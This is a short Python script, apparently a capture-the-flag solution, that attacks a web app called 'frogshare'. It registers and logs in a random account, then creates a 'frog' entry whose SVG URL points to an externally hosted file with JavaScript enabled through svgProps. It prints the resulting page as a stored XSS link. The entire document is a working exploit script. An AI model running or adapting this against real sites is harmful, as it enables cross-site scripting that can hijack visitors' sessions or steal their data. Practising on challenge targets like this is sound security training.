import requests
from string import ascii_letters
import random
import json


s = requests.Session()

def login(url):
    data = {
        "username": ''.join(random.choices(ascii_letters, k=5)),
        "password": ''.join(random.choices(ascii_letters, k=5))
    }
    # print(data)
    res = s.post(url + "/api/auth/register", json=data)
    print(res.text)
    res = s.post(url + "/api/auth/login", json=data)
    print(res.text)


def create(url, url_svg):
    payload = {
        "name": ''.join(random.choices(ascii_letters, k=5)), 
        "url": url_svg, 
        "svgProps": {
            "data-js": "enabled",
            "height": 64, "width": 64
            }
        }
    res = s.post(url + "/api/frogs", json=payload)
    print(res.text)
    data = json.loads(res.text)
    return data["id"]

def main():
    url = "https://frogshare.be.ax"
    url_svg = "https://raw.githubusercontent.com/5h4s1/CTF_write_up/main/a.svg"
    login(url)
    id = create(url, url_svg)
    print("URL XSS: ", end="")
    print(url + f"/frogs/{id}")

if __name__ == "__main__":
    main()